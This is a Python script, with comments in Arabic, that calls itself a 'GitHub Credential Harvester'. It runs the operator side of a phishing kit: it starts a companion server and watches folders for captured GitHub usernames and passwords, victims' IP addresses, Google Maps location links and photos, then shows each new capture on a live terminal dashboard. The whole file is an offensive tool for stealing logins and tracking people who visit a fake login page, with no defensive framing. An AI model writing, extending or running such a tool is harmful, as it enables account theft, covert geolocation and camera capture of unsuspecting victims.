import os
import json
import time
import subprocess
import sys
from datetime import datetime
from colorama import init, Fore, Back, Style
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import threading

# تهيئة الألوان في الطرفية
init()

# المجلدات المطلوبة
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))  # مسار المجلد الحالي
DATA_DIR = os.path.join(SCRIPT_DIR, 'data')
UPLOAD_DIR = os.path.join(SCRIPT_DIR, 'upload')

class DataCollector(FileSystemEventHandler):
    def __init__(self):
        # إنشاء المجلدات إذا لم تكن موجودة
        os.makedirs(DATA_DIR, exist_ok=True)
        os.makedirs(UPLOAD_DIR, exist_ok=True)
        
        # تخزين آخر البيانات
        self.current_data = {
            'username': '',
            'password': '',
            'maps_url': '',
            'ip_address': '',
            'visitors': 0,
            'logins': 0,
            'photos': 0
        }
        
        # متغيرات الأنيميشن
        self.animation_frame = 0
        self.dots_count = 0
        
        # تنظيف الشاشة وعرض الواجهة الأولية
        self.clear_screen()
        self.show_initial_display()
        
        # تهيئة خيط العرض
        self.running = True
        self.display_thread = threading.Thread(target=self.update_display, daemon=True)
        self.display_thread.start()

    def clear_screen(self):
        """تنظيف الشاشة"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_initial_display(self):
        """عرض الواجهة الأولية"""
        banner = f"""{Fore.RED}

 ░▒▓██████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
{Fore.LIGHTRED_EX}░▒▓█▓▒▒▓███▓▒░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
{Fore.RED} ░▒▓██████▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
                                                                              
{Style.RESET_ALL}
    """
        print(banner)
        print(f"{Fore.RED}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] GitHub Credential Harvester v1.0{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Monitoring GitHub Login Page...{Style.RESET_ALL}")
        print(f"{Fore.RED}{'═'*70}{Style.RESET_ALL}\n")

    def create_progress_bar(self):
        """إنشاء شريط التقدم المتحرك"""
        width = 50
        position = self.animation_frame % width
        bar = ["·"] * width
        bar[position] = "■"
        
        colored_bar = ""
        for i, char in enumerate(bar):
            if i == position:
                colored_bar += f"{Fore.GREEN}{char}{Style.RESET_ALL}"
            else:
                colored_bar += f"{Fore.WHITE}{char}{Style.RESET_ALL}"
        
        return f"{Fore.WHITE}[{colored_bar}{Fore.WHITE}]{Style.RESET_ALL}"

    def update_display(self):
        """تحديث العرض بشكل مستمر"""
        while self.running:
            self.clear_screen()
            self.show_initial_display()
            
            # عرض البيانات
            print(f"{Back.GREEN}{Fore.BLACK} ACTIVE SESSION {Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Visitors         : {Fore.GREEN}{self.current_data['visitors']}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Login Attempts   : {Fore.YELLOW}{self.current_data['logins']}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Photos Captured  : {Fore.MAGENTA}{self.current_data['photos']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
            
            print(f"{Back.YELLOW}{Fore.BLACK} LAST CAPTURE {Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Username     : {Fore.LIGHTBLUE_EX}{self.current_data['username'] or 'Waiting...'}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Password     : {Fore.GREEN}{self.current_data['password'] or 'Waiting...'}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}IP Address   : {Fore.YELLOW}{self.current_data['ip_address'] or 'Waiting...'}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Location     : {Fore.MAGENTA}{self.current_data['maps_url'] or 'Waiting...'}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
            
            print(self.create_progress_bar())
            print(f"\n{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
            
            self.animation_frame += 1
            time.sleep(0.1)

    def process_login_file(self, file_path):
        """معالجة ملف تسجيل الدخول"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                data = {}
                for line in lines:
                    if ':' in line:
                        key, value = line.strip().split(':', 1)
                        data[key.strip()] = value.strip()
                
                self.current_data['username'] = data.get('username', '')
                self.current_data['password'] = data.get('password', '')
                self.current_data['ip_address'] = data.get('ip_address', '')
                self.current_data['logins'] += 1
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error processing login file: {str(e)}{Style.RESET_ALL}")

    def process_location_file(self, file_path):
        """معالجة ملف الموقع"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                for line in lines:
                    if 'Maps URL:' in line:
                        self.current_data['maps_url'] = line.split('Maps URL:', 1)[1].strip()
                        break
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error processing location file: {str(e)}{Style.RESET_ALL}")

    def on_created(self, event):
        if event.is_directory:
            return
            
        if event.src_path.endswith('.txt'):
            if 'login_' in event.src_path:
                self.process_login_file(event.src_path)
            elif 'location_' in event.src_path:
                self.process_location_file(event.src_path)
            
        elif event.src_path.endswith('.jpg'):
            self.current_data['photos'] += 1

def start_monitoring():
    """بدء المراقبة وتشغيل الخادم"""
    os.chdir(SCRIPT_DIR)
    
    collector = DataCollector()
    observer = Observer()
    observer.schedule(collector, DATA_DIR, recursive=False)
    observer.schedule(collector, UPLOAD_DIR, recursive=False)
    observer.start()

    try:
        minimal_app_path = os.path.join(SCRIPT_DIR, 'minimal_app.py')
        if not os.path.exists(minimal_app_path):
            raise FileNotFoundError(f"Could not find minimal_app.py in {SCRIPT_DIR}")
        
        env = os.environ.copy()
        env['PYTHONIOENCODING'] = 'utf-8'
        
        app_process = subprocess.Popen(
            [sys.executable, minimal_app_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=SCRIPT_DIR,
            env=env,
            text=True,
            encoding='utf-8'
        )
        
        while True:
            time.sleep(0.1)
            if app_process.poll() is not None:
                print(f"\n{Fore.RED}[!] Server stopped with exit code: {app_process.poll()}{Style.RESET_ALL}")
                break
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping server...{Style.RESET_ALL}")
        collector.running = False
        observer.stop()
        if 'app_process' in locals():
            app_process.terminate()
        
        time.sleep(1)
        collector.clear_screen()
        print(f"\n{Fore.GREEN}[✓] Server stopped successfully{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Cleanup completed{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}Thank you for using GitHub Harvester!{Style.RESET_ALL}\n")
        sys.exit(0)
        
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        collector.running = False
        if 'app_process' in locals():
            app_process.terminate()
    
    observer.join()

if __name__ == '__main__':
    try:
        start_monitoring()
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        time.sleep(1)
        os.system('cls' if os.name == 'nt' else 'clear') 